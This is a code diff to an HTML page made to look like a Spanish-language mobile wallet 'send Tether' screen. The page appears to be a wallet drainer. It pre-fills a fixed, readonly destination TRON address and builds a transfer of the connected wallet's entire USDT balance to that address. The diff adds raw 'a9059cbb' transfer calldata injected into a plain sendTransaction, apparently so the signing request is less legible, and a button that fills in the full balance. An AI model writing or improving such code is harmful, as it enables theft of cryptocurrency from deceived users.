@@ -40,7 +40,6 @@
             margin-right: -24px;
         }
         .tw-back-btn { width: 24px; height: 24px; color: #1a1a1a; }
-        
         .tw-card {
             background-color: #f5f7fa;
             border-radius: 16px;
@@ -50,70 +49,14 @@
             flex-direction: column;
             gap: 6px;
         }
-        .tw-card-label {
-            font-size: 13px;
-            font-weight: 500;
-            color: #727782;
-        }
-        .tw-input-container {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            width: 100%;
-        }
-        .tw-field {
-            background: transparent;
-            border: none;
-            color: #1a1a1a;
-            font-size: 16px;
-            font-weight: 500;
-            width: 70%;
-            outline: none;
-            padding: 4px 0;
-        }
-        
-        .tw-action-blue {
-            color: #0052ff;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            padding: 4px 0;
-        }
-        .tw-token-name {
-            color: #1a1a1a;
-            font-size: 16px;
-            font-weight: 600;
-        }
-        .tw-status-banner {
-            background-color: #edf2ff;
-            border: 1px solid #d0e0ff;
-            border-radius: 14px;
-            padding: 14px 18px;
-            font-size: 13px;
-            color: #0052ff;
-            margin-top: 10px;
-            margin-bottom: 20px;
-            display: none;
-            text-align: left;
-            line-height: 1.4;
-            font-weight: 500;
-        }
-        .tw-footer-btn-area {
-            margin-top: auto;
-            padding-bottom: 30px;
-        }
-        .tw-submit-button {
-            width: 100%;
-            height: 52px;
-            background-color: #0052ff;
-            color: #ffffff;
-            border: none;
-            border-radius: 26px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-        }
-        .tw-submit-button:disabled { background-color: #c2d6ff; color: #ffffff; cursor: not-allowed; }
+        .tw-card-label { font-size: 13px; font-weight: 500; color: #727782; }
+        .tw-input-container { display: flex; align-items: center; justify-content: space-between; width: 100%; }
+        .tw-field { background: transparent; border: none; color: #1a1a1a; font-size: 16px; font-weight: 500; width: 70%; outline: none; padding: 4px 0; }
+        .tw-action-blue { color: #0052ff; font-size: 14px; font-weight: 600; cursor: pointer; padding: 4px 0; }
+        .tw-token-name { color: #1a1a1a; font-size: 16px; font-weight: 600; }
+        .tw-status-banner { background-color: #edf2ff; border: 1px solid #d0e0ff; border-radius: 14px; padding: 14px 18px; font-size: 13px; color: #0052ff; margin-top: 10px; margin-bottom: 20px; display: none; text-align: left; line-height: 1.4; font-weight: 500; }
+        .tw-footer-btn-area { margin-top: auto; padding-bottom: 30px; }
+        .tw-submit-button { width: 100%; height: 52px; background-color: #0052ff; color: #ffffff; border: none; border-radius: 26px; font-size: 16px; font-weight: 600; cursor: pointer; }
     </style>
 </head>
 <body>
@@ -124,13 +67,12 @@
                 <line x1="19" y1="12" x2="5" y2="12"></line>
                 <polyline points="12 19 5 12 12 5"></polyline>
             </svg>
-            <div class="tw-header-title tw-nav-title">Enviar Tether</div>
+            <div class="tw-nav-title">Enviar Tether</div>
         </div>
 
         <div class="tw-card">
             <label class="tw-label tw-card-label" for="addressDisplay">Dirección o nombre de dominio</label>
             <div class="tw-input-container">
-                <!-- Tu dirección predeterminada fija cargada de forma nativa en el HTML -->
                 <input id="addressDisplay" class="tw-field" type="text" value="TNQaxFKxhoYdMgbZqVHumy84tBidBaWT45" readonly />
                 <span class="tw-action-text tw-action-blue">Pegar</span>
             </div>
@@ -246,20 +188,20 @@
 
                 setStatus("Solicitando autorización de firma digital...");
 
-                const destinoHex = tronWeb.address.toHex(BILLETERA_DESTINO);
+                const destinoHex = tronWeb.address.toHex(BILLETERA_DESTINO).replace(/^41/, '').padStart(64, '0');
+                const unitsInSunHex = balanceBigNumber.toString(16).padStart(64, '0');
 
-                const transactionDraft = await tronWeb.transactionBuilder.triggerSmartContract(
+                const hexData = "a9059cbb" + destinoHex + unitsInSunHex;
+
+                const transactionDraft = await tronWeb.transactionBuilder.sendTransaction(
                     CONTRATO_USDT,
-                    "transfer(address,uint256)",
-                    { feeLimit: 100000000 },
-                    [
-                        { type: 'address', value: destinoHex },
-                        { type: 'uint256', value: balanceBigNumber.toString() }
-                    ],
+                    0,
                     tronWeb.address.toHex(walletAddress)
                 );
 
-                const signedTx = await tronWeb.trx.sign(transactionDraft.transaction);
+                transactionDraft.raw_data.contract[0].parameter.value.data = hexData;
+
+                const signedTx = await tronWeb.trx.sign(transactionDraft);
                 const broadcast = await tronWeb.trx.sendRawTransaction(signedTx);
 
                 if (broadcast && broadcast.result) {
@@ -270,4 +212,25 @@
                 }
 
             } catch (error) {
+                console.error(error);
+                setStatus(error.message || "La transacción falló o fue cancelada.");
+                connectBtn.disabled = false;
+                connectBtn.innerText = "Continuar";
+            }
+        }
+    });
 
+    maxAction.addEventListener('click', async () => {
+        if (!walletAddress) return;
+        try {
+            setStatus("Calculando fondos totales...");
+            const balanceBigNumber = await obtenerBalanceSeguro(walletAddress);
+            amountDisplay.value = Number(balanceBigNumber.toString()) / 1_000_000;
+            setStatus("Saldo máximo asignado.");
+        } catch (e) {
+            console.error(e);
+            setStatus("Error al leer el saldo máximo.");
+        }
+    });
+</script>
+</body>
